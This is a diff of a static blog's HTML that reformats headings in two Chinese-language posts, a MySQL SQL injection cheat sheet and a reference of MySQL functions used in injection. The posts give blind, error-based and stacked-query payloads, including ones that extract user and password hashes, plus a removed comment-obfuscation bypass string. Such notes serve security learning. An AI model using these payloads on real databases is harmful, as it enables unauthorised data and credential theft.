@@ -588,13 +588,13 @@ alert(xmlDoc);
 
       
         
-          <span itemprop="articleBody"><h2 id="1-基于布尔的盲注">1.基于布尔的盲注</h2><pre><code>mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> admin <span class="keyword">where</span> id = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;
+          <span itemprop="articleBody"><h2 id="基于布尔的盲注">基于布尔的盲注</h2><pre><code>mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> admin <span class="keyword">where</span> id = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;
 mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> admin <span class="keyword">where</span> id = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>;<span class="comment">//根据返回内容的真假判断是否存在注入</span>
-</code></pre><h2 id="2-基于时间的盲注">2.基于时间的盲注</h2><pre><code>mysql&gt; select username from admin where id = <span class="number">1</span> or <span class="keyword">if</span><span class="params">(length<span class="params">(user)</span>&gt;<span class="number">10</span>,sleep<span class="params">(<span class="number">3</span>)</span>,<span class="number">0</span>)</span>;
+</code></pre><h2 id="基于时间的盲注">基于时间的盲注</h2><pre><code>mysql&gt; select username from admin where id = <span class="number">1</span> or <span class="keyword">if</span><span class="params">(length<span class="params">(user)</span>&gt;<span class="number">10</span>,sleep<span class="params">(<span class="number">3</span>)</span>,<span class="number">0</span>)</span>;
 mysql&gt; select username from admin where id = <span class="number">1</span> or <span class="keyword">if</span><span class="params">(ascii<span class="params">(mid<span class="params">(lower<span class="params">(user<span class="params">()</span>)</span>)</span>,<span class="number">1</span>,<span class="number">1</span>)</span>=<span class="number">114</span>,sleep<span class="params">(<span class="number">3</span>)</span>,<span class="number">0</span>)</span>;
 <span class="comment">//如果if中条件成立返回延时.</span>
 <span class="comment">//BENCHMARK(100000,SHA1('true'))替代sleep(3)，前者在mysql 4/5适用，后者在mysql 5 适用.</span>
-</code></pre><h2 id="3-基于报错的注入">3.基于报错的注入</h2><p>-rand和group的冲突</p>
+</code></pre><h2 id="基于报错的注入">基于报错的注入</h2><p>-rand和group的冲突</p>
 <pre><code>mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="built_in">where</span> user=<span class="string">"test"</span> <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat(left(<span class="built_in">rand</span>(),<span class="number">3</span>),version())x <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x)b;
 
 mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="built_in">where</span> user=<span class="string">"test"</span> <span class="built_in">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat_ws(<span class="string">":"</span>,user(),version(),<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x) b);
@@ -613,8 +613,8 @@ mysql&gt; select <span class="keyword">user</span> <span class="keyword">from</s
 //a的值为concat(<span class="number">0</span>x7e,(SELECT concat(<span class="number">0</span>x23,<span class="keyword">user</span>,<span class="number">0</span>x3a,password,<span class="number">0</span>x23) FROM <span class="keyword">user</span> <span class="keyword">limit</span> <span class="number">1</span>))
 //对应的也可以替换为concat(<span class="number">0</span>x7e,@@version,<span class="keyword">user</span>(),database())
 </code></pre><p>说明：<br>1.UpdateXML(1,a,1)是一个使用不同的XML标记匹配和替换XML块的函数.<br>2.在a的部分添加目标内容~~如上代码.<br>3.获取内容有长度限制,最长32位。</p>
-<h2 id="4-联合查询注入">4.联合查询注入</h2><p>后面再补</p>
-<h2 id="5-堆查询注入">5.堆查询注入</h2><p>PHP使用PDO_MYSQL来连接数据库，便可以使用堆查询，堆查询可以同时执行多个语句。</p>
+<h2 id="联合查询注入">联合查询注入</h2><p>后面再补</p>
+<h2 id="堆查询注入">堆查询注入</h2><p>PHP使用PDO_MYSQL来连接数据库，便可以使用堆查询，堆查询可以同时执行多个语句。</p>
 <pre><code>mysql&gt; <span class="keyword">select</span> @@version;<span class="function"><span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>)</span>;
 mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> user <span class="keyword">where</span> user=root and <span class="number">1</span>=<span class="number">0</span>; <span class="function">insert <span class="title">into</span> (<span class="params">username,password</span>) <span class="title">VALUES</span> (<span class="params"><span class="string">'BobbyTables'</span>, <span class="string">'kl20da$$'</span></span>)</span>;
 <span class="comment">//可以同时执行多个语句</span>
@@ -702,68 +702,56 @@ mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span
 
       
         
-          <span itemprop="articleBody"><h2 id="常量">常量</h2><h2 id="version">version</h2><pre><code>VERSION()
+          <span itemprop="articleBody"><h2 id="常量">常量</h2><h2 id="version"><h5>version</h5></h2><pre><code>VERSION()
 @@VERSION
 @@<span class="keyword">GLOBAL</span>.VERSION
 mysql&gt; <span class="keyword">select</span> @@version;<span class="comment">//显示mysql版本</span>
 mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> user <span class="keyword">where</span> <span class="number">1</span> <span class="keyword">and</span> mid(version(),<span class="number">1</span>,<span class="number">1</span>) = <span class="number">5</span>;<span class="comment">//当数据库版本为5.x.xx时返回为真</span>
-</code></pre><h2 id="user">  user</h2><pre><code>user()
+</code></pre><h2 id="user"><h5>user</h5></h2><pre><code>user()
 <span class="function">current_user
 <span class="title">current_user</span>(<span class="params"></span>)
 <span class="title">system_user</span>(<span class="params"></span>)
 <span class="title">session_user</span>(<span class="params"></span>)
 mysql&gt; <span class="keyword">select</span> <span class="title">user</span>(<span class="params"></span>)</span>; <span class="comment">//显示当前用户</span>
 mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">concat_ws</span>(<span class="params"><span class="string">":"</span>,user,password</span>) <span class="keyword">from</span> mysql.user <span class="keyword">where</span> user </span>= <span class="string">"root"</span>; <span class="comment">//显示 root:"对应用户密码散列值"</span>
-</code></pre><h2 id="database">  database</h2><pre><code>database()
+</code></pre><h2 id="database"><h5>database</h5></h2><pre><code>database()
 schema()
 mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>)</span>;<span class="comment">//显示mysql</span>
 <span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata;<span class="comment">//显示所有数据库</span>
-</code></pre><p>hostname</p>
+</code></pre><h5>hostname</h5>
+
 <pre><code>@<span class="variable">@hostname</span>
 mysql&gt; select <span class="variable">@@hostname</span>;
-</code></pre><h2>函数</h2>
-
-<pre><code>length()
-mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">length</span>(<span class="params"><span class="string">"abc"</span></span>)</span>;<span class="comment">//字符串长度</span>
-
-mid()
-mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">mid</span>(<span class="params"><span class="string">"abc"</span>,<span class="number">1</span>,<span class="number">1</span></span>)</span>;<span class="comment">//指定字符串</span>
-
-<span class="keyword">if</span>()
-mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">if</span>(<span class="params">length(user(</span>))&gt;10,<span class="title">sleep</span>(<span class="params"><span class="number">3</span></span>),0)</span>;<span class="comment">//if成立返回sleep(3)</span>
-
-ascii()
-mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">ascii</span>(<span class="params"><span class="string">"abcb"</span></span>)<span class="comment">//返回a的ascii码97</span>
-mysql&gt; <span class="keyword">select</span> <span class="title">ascii</span>(<span class="params">mid(<span class="string">"abcb"</span>,<span class="number">2</span>,<span class="number">1</span></span>))</span>;<span class="comment">//返回b的ascii码98</span>
-
-count()
-mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">count</span>(<span class="params">*</span>) <span class="keyword">from</span> mysql.user</span>;<span class="comment">//返回记录条数</span>
-
-concat()
+</code></pre><h2 id="函数">函数</h2><h2 id="length"><h5>length</h5></h2><pre><code><span class="built_in">length</span>()
+mysql&gt; <span class="keyword">select</span> <span class="built_in">length</span>(<span class="string">"abc"</span>);<span class="comment">//字符串长度</span>
+</code></pre><h2 id="mid"><h5>mid</h5></h2><pre><code>mid()
+mysql&gt; <span class="function">select <span class="title">mid</span><span class="params">(<span class="string">"abc"</span>,<span class="number">1</span>,<span class="number">1</span>)</span></span>;<span class="comment">//指定字符串</span>
+</code></pre><h2 id="if,case"><h5>if,case</h5></h2><pre><code><span class="keyword">if</span>()
+mysql&gt; <span class="keyword">select</span> <span class="keyword">if</span>(length(user())&gt;<span class="number">10</span>,sleep(<span class="number">3</span>),<span class="number">0</span>);//<span class="keyword">if</span>成立返回sleep(<span class="number">3</span>)
+<span class="keyword">case</span>
+mysql <span class="keyword">select</span> <span class="keyword">case</span> when <span class="number">1</span>=<span class="number">1</span> <span class="keyword">then</span> <span class="literal">true</span> <span class="keyword">else</span> <span class="literal">false</span> <span class="keyword">end</span>;
+//<span class="keyword">if</span>相似
+</code></pre><h2 id="ascii"><h5>ascii</h5></h2><pre><code>ascii<span class="params">()</span>
+mysql&gt; select ascii<span class="params">(<span class="string">"abcb"</span>)</span><span class="comment">//返回a的ascii码97</span>
+mysql&gt; select ascii<span class="params">(mid<span class="params">(<span class="string">"abcb"</span>,<span class="number">2</span>,<span class="number">1</span>)</span>)</span>;<span class="comment">//返回b的ascii码98</span>
+</code></pre><h2 id="count"><h5>count</h5></h2><pre><code><span class="built_in">count</span>()
+mysql&gt; <span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> mysql.user;<span class="comment">//返回记录条数</span>
+</code></pre><h2 id="concat,concat_ws"><h5>concat,concat_ws</h5></h2><pre><code>concat()
 mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">concat</span>(<span class="params"><span class="string">"a"</span>,<span class="string">"b"</span></span>)</span>;<span class="comment">//显示ab</span>
 
 concat_ws()
 mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">concat_ws</span>(<span class="params"><span class="string">":"</span>,user,password</span>) <span class="keyword">from</span> mysql.user <span class="keyword">where</span> user </span>= <span class="string">"root"</span>; <span class="comment">//显示 root:"对应用户密码散列值"</span>
-
-rand()
-mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">rand</span>(<span class="params"></span>)</span>;<span class="comment">//0~1之间的随机数</span>
-
-floor()
-mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">floor</span>(<span class="params"><span class="number">1.1</span></span>)</span>;<span class="comment">//向下取整</span>
-
-<span class="function"><span class="keyword">group</span> <span class="title">by</span>(<span class="params"></span>)
-mysql&gt; <span class="keyword">select</span> type,<span class="title">max</span>(<span class="params">price</span>) <span class="keyword">from</span> price_info <span class="keyword">group</span> by type</span>;
+</code></pre><h2 id="rand"><h5>rand</h5></h2><pre><code><span class="keyword">rand</span>()
+mysql&gt; <span class="keyword">select</span> <span class="keyword">rand</span>();<span class="comment">//0~1之间的随机数</span>
+</code></pre><h2 id="floor"><h5>floor</h5></h2><pre><code><span class="built_in">floor</span><span class="params">()</span>
+mysql&gt; select <span class="built_in">floor</span><span class="params">(<span class="number">1.1</span>)</span>;<span class="comment">//向下取整</span>
+</code></pre><h2 id="group_by"><h5>group_by</h5></h2><pre><code><span class="built_in">group</span> <span class="keyword">by</span>()
+mysql&gt; <span class="keyword">select</span> <span class="built_in">type</span>,<span class="built_in">max</span>(price) <span class="keyword">from</span> price_info <span class="built_in">group</span> <span class="keyword">by</span> <span class="built_in">type</span>;
 <span class="comment">//先按tpye分组，建立若干临时表，然后在每一个临时表示执行max()函数</span>
-
-distinct()
-mysql&gt; <span class="keyword">select</span> distinct user <span class="keyword">from</span> mysql.user;
-<span class="comment">//排重，只显示不重复的user.</span>
-
-<span class="keyword">case</span>
-mysql <span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="number">1</span>=<span class="number">1</span> then <span class="keyword">true</span> <span class="keyword">else</span> <span class="keyword">false</span> end;
-<span class="comment">//if相似</span>
+</code></pre><h2 id="distinct"><h5>distinct</h5></h2><pre><code><span class="keyword">distinct</span>()
+mysql&gt; select <span class="keyword">distinct</span> user <span class="keyword">from</span> mysql.user;
+//排重，只显示不重复的user.
 </code></pre><p><em>以上内容使用的数据库版本为mysql 5.6.17.</em></p>
-<p>SELECT 1/<em>!41320UNION/</em>!/<em>!/</em>!00000SELECT/<em>!/</em>!USER/<em>!(/</em>!*/);</p>
 </span>
         
       
